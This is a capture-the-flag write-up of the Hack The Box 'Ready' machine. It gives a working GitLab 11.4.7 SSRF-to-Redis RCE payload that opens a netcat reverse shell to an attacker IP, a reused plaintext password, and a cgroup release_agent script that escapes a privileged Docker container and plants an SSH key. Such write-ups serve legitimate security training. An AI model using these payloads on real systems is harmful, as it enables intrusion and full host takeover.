---
title: "[HTB] Ready WriteUp"
date: 2021-05-15T19:00:00-00:00
categories:
  - Hack The Box
excerpt: "Ready is a medium difficulty machine on Hack the Box."
header:
  teaser: "/assets/ready/ready.jpg"
tags:
  - HTB
  - Hack The Box
  - Ready
  - WriteUp
  - Linux
  - Docker
  - GitLab
---

![Ready]({{ site.url }}{{ site.baseurl }}/assets/ready/ready.jpg)

Ready is a medium difficulty machine on Hack the Box. We find an outdated instance of GitLab, we exploit a known RCE vulnerability to get a shell. Some simple enumeration leads to User. We then break out of the docker container to get Root.

I begin with an nmap scan.

```bash
nmap -sC -sV -o scans/nmap 10.10.10.220
```

```bash
# Nmap 7.91 scan initiated Mon Dec 28 10:05:11 2020 as: nmap -sC -sV -o scans/nmap 10.10.10.220
Nmap scan report for 10.10.10.220
Host is up (0.073s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
|_http-title: GitLab is not responding (502)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec 28 10:05:54 2020 -- 1 IP address (1 host up) scanned in 43.20 seconds
```

There is only 2 ports open, 22 and 5080. Lets check out port 5080.

![Gitlab login / Register]({{ site.url }}{{ site.baseurl }}/assets/ready/gitlab-login.png)

I register an account and login.

![Gitlab Welcome Page]({{ site.url }}{{ site.baseurl }}/assets/ready/gitlab-welcome.jpg)

After  clicking around for a while I notice the gitlab version number on the help page, with a warning about gitlab being out of date.

![Gitlab Version]({{ site.url }}{{ site.baseurl }}/assets/ready/gitlab-version.jpg)

 Some googling reveals an RCE vulnerability in this version of gitlab.

[GitLab 11.4.7 Remote Code Execution](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)

To get Remote code execution we follow the steps in the article.

- Create a new project
- Select "Import Project"
- click "Repo by URL"
- At this stage we need a payload, we can use the one from the article 

```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|cat /flag | nc 10.10.14.2 9001 -e /bin/bash \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
/ssrf.git
```
We URL encode the payload
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%2010%2E10%2E14%2E10%209001%20%2de%20%2fbin%2fbash%20%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git
```

And add it to the URL

- Before Creating the project we need to start a listener to catch the shell

```bash
nc -lvnp 9001
```

- Click Create

We get a shell!

```bash
id 
uid=998(git) gid=990(git) groups=998(git)
```

### Privilege Escalation 

The shell we are in is a docker image, to get the user flag we will need to get root in the docker container. After some enumeration we find an interesting file /opt/backup/gitlab.rb

```bash
$ cat gitlab.rb
...
# gitlab_rails['smtp_enable'] = true                                                           
# gitlab_rails['smtp_address'] = "smtp.server"                                                 
# gitlab_rails['smtp_port'] = 465                                                              
# gitlab_rails['smtp_user_name'] = "smtp user"                                                      
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"                                  
# gitlab_rails['smtp_domain'] = "example.com"                                                  
# gitlab_rails['smtp_authentication'] = "login"                                                
# gitlab_rails['smtp_enable_starttls_auto'] = true                                             
# gitlab_rails['smtp_tls'] = false
...
```

We can use the password to change user to root within the docker container. And get the User flag.

```bash
su 
password: wW59U!ZKMbG9+*#h
root@gitlab:/opt/backup# cat ~/user.txt
```

### Getting Root

The docker container that we are still in is a privileged container, meaning it was run with the --privileged flag. 

[Privileged Containers](https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1).

By following the article we can write the following bash script. Replacing your_id_rsa.pub with your id_rsa.pub contents.

```bash
mkdir /tmp/JDMCE && mount -t cgroup -o rdma cgroup /tmp/JDMCE && mkdir /tmp/JDMCE/x
echo 1 > /tmp/JDMCE/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/JDMCE/release_agent

echo '#!/bin/sh' > /cmd
echo "echo 'your_id_rsa.pub' > /root/.ssh/authorized_keys" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/JDMCE/x/cgroup.procs"
```

We transfer the script to the taget machine, make it executable and run it. The script will add our id_rsa.pub to the authorized_keys file on the target.

```bash
wget http://10.10.14.2/exploit.sh
chmod +x exploit.sh
./exploit.sh
```

We can then SSH in and get the root flag

```bash
root@ready:~# id 
uid=0(root) gid=0(root) groups=0(root)
```

